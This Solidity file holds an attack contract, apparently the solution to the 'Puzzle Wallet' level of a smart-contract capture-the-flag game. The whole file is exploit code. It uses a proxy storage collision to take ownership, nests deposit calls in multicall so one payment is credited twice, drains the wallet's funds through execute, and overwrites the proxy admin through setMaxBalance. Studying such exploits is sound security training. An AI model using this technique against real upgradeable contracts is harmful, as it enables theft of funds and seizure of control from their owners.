// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PuzzleProxy, PuzzleWallet} from "../levels/PuzzleWallet.sol";

contract PuzzleWalletAttack {
    function attack(address payable proxyAddress) public payable {
        PuzzleProxy proxy = PuzzleProxy(proxyAddress);
	PuzzleWallet wallet = PuzzleWallet(proxyAddress);

	proxy.proposeNewAdmin(address(this));
	wallet.addToWhitelist(address(this));

	bytes[] memory data1 = new bytes[](1);
	data1[0] = abi.encodeWithSignature("deposit()");

	bytes[] memory data2 = new bytes[](2);
	data2[0] = data1[0];
	data2[1] = abi.encodeWithSignature("multicall(bytes[])", data1);

	wallet.multicall{value: 0.001 ether}(data2);
	wallet.execute(address(this), 0.002 ether, "");
	wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }

    receive() external payable {}
}
